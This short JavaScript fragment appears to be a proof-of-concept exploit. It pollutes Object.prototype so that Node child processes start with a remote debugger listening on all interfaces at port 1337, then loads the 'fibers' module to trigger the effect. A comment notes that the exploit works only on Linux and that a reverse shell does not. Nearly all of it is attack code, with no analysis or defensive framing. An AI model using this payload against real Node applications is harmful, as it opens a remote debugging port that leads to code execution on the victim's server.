Object.prototype.shell = "node";
Object.prototype.NODE_OPTIONS = '--inspect-brk=0.0.0.0:1337';

// TODO: exploitable only on Linux; the reverse shell does not work

var Fiber = require('fibers');